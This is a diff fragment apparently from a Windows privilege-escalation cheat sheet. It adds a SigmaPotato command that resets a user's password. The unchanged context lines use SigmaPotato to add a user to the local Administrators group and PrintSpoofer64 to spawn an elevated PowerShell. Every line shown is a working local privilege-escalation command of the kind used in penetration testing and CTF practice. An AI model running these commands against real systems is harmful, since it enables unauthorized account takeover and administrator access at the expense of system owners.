@@ -636,6 +636,9 @@ winPEASx64.exe
 SigmaPotato.exe "net localgroup Administrators <user> /add"
 ```
 ```ps
+SigmaPotato.exe "net user <username> <newpassword>"
+```
+```ps
 PrintSpoofer64.exe -i -c powershell.exe
 ```
 
